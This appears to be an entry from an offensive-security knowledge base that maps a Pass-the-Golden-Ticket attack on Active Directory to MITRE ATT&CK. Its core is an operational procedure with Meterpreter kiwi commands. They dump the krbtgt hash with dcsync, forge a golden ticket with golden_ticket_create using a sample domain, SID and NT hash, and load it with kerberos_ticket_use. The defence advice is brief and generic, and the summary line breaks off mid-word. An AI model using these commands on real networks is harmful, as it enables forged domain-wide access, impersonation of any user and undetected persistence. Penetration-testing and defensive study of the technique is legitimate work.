---
id: 1a97f633-126e-4ce6-ab57-8c47934e0802
name: Pass-the-Golden-Ticket Attack using Meterpreter
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:04.763226+00:00'
updated_at: '2023-04-10T20:25:44.389727+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]'
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
- '[[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]'
sub_techniques:
- '[[Golden Ticket|T1558.001 - Golden Ticket]]'
- '[[Pass the Ticket|T1550.003 - Pass the Ticket]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Kerberos Tickets]]'
- '[[Pass-the-Ticket Golden Tickets]]'
- '[[Using Meterpreter]]'
commands:
- '[[Forge a Golden ticket - Meterpreter]]'
- '[[Get info - Meterpreter(kiwi)]]'
---

# Pass-the-Golden-Ticket Attack using Meterpreter

## Summary

A Pass-the-Golden-Ticket attack is a technique used by attackers to gain unauthorized access to a network by forging Kerberos tickets. This attack can be performed using Meterpreter, a popular post-exploitation tool. By creating a Golden Ticket using kiwi, an attacker can impersonate any user in th

## Description

# Description

A Pass-the-Golden-Ticket attack is a technique used by attackers to gain unauthorized access to a network by forging Kerberos tickets. This attack can be performed using Meterpreter, a popular post-exploitation tool. By creating a Golden Ticket using kiwi, an attacker can impersonate any user in the domain and gain access to any resource. This technique is particularly dangerous because it allows the attacker to persist in the network without being detected.

 

## Requirements

1. Valid domain credentials

1. Access to a machine with Meterpreter installed

1. kiwi tool

 

## Defense

1. Implement strong password policies and multi-factor authentication to prevent credential theft

1. Monitor for unusual activity in the network, such as unusual logins or access to sensitive resources

1. Regularly review and remove unnecessary privileges to limit the potential impact of a Golden Ticket attack

 

## Objectives

1. Gain unauthorized access to a network

1. Impersonate any user in the domain

1. Persist in the network without being detected

 

# Instructions

1. To create a golden ticket using kiwi, follow the below instructions:
1. Load kiwi using the command 'load kiwi'.
2. Use the command 'golden_ticket_create' to create a golden ticket.
3. Specify the domain name using '-d' option.
4. Provide the NT hash of krbtgt using '-k' option.
5. Specify the SID without the RID using '-s' option.
6. Provide the user for the ticket using '-u' option.
7. Specify the location to store the ticket using '-t' option.
8. To purge the Kerberos ticket, use 'kerberos_ticket_purge' command.
9. Use 'kerberos_ticket_use' command to use the created ticket for authentication.
10. To list all the available Kerberos tickets, use 'kerberos_ticket_list' command.

 



**Code**: [[# Get info - Meterpreter(kiwi)
dcsync_ntlm krbtgt
]]



> This command is used to forge a Golden ticket using kiwi in Meterpreter. The 'golden_ticket_create' command is used to create the ticket by specifying the domain name, NT hash of krbtgt, SID without the RID, user for the ticket and location to store the ticket. Once the ticket is created, it can be used for authentication using 'kerberos_ticket_use' command. The 'kerberos_ticket_purge' command is used to purge the Kerberos ticket and 'kerberos_ticket_list' command is used to list all the available Kerberos tickets.



**Command** ([[Get info - Meterpreter(kiwi)]]):

```bash
dcsync_ntlm krbtgt
dcsync krbtgt
```





**Command** ([[Forge a Golden ticket - Meterpreter]]):

```bash
load kiwi
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
kerberos_ticket_purge
kerberos_ticket_use /root/Downloads/pentestlabuser.tck
kerberos_ticket_list
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]
- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]
- [[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]

### Sub-Techniques

- [[Golden Ticket|T1558.001 - Golden Ticket]]
- [[Pass the Ticket|T1550.003 - Pass the Ticket]]

## Commands Used

- [[Forge a Golden ticket - Meterpreter]]
- [[Get info - Meterpreter(kiwi)]]

## Tags

- [[Active Directory Attacks]]
- [[Kerberos Tickets]]
- [[Pass-the-Ticket Golden Tickets]]
- [[Using Meterpreter]]


